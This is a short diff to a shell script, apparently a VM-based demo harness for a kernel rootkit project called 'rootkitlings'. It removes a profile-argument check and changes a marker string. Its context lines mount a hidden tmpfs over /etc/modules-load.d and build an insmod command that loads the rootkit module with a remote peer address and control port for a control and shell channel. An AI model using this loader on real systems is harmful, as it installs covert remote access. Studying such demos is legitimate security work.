@@ -5,11 +5,10 @@ set -eu
 # shellcheck source=scripts/lib/ui.sh
 . /vm/ui.sh
 
-profile=${1:-}
-key=${2:-}
-peer=${3:-}
-control_port=${4:-}
-shell_port=${5:-}
+key=${1:-}
+peer=${2:-}
+control_port=${3:-}
+shell_port=${4:-}
 
 show()
 {
@@ -22,10 +21,6 @@ run()
 	"$@"
 }
 
-if test "$profile" != authenticated-agent; then
-	ui_die "Unknown play profile: $profile"
-fi
-
 ui_heading 'Completed authenticated agent'
 ui_field 'Control peer' "$peer:$control_port"
 ui_field 'Shell peer' "$peer:$shell_port"
@@ -34,8 +29,8 @@ run mkdir -p /etc/modules-load.d
 run mount -t tmpfs -o nosuid,nodev,noexec,mode=0700 tmpfs \
 	/etc/modules-load.d
 run chmod 0700 /etc/modules-load.d
-show "printf 'operator-original\\n' > /etc/modules-load.d/rootkitlings.conf"
-printf 'operator-original\n' > /etc/modules-load.d/rootkitlings.conf
+show "printf 'original-request\\n' > /etc/modules-load.d/rootkitlings.conf"
+printf 'original-request\n' > /etc/modules-load.d/rootkitlings.conf
 run chmod 0600 /etc/modules-load.d/rootkitlings.conf
 command='insmod /rootkitlings/rootkitlings.ko'
 command="$command peer_address=$peer peer_port=$control_port"
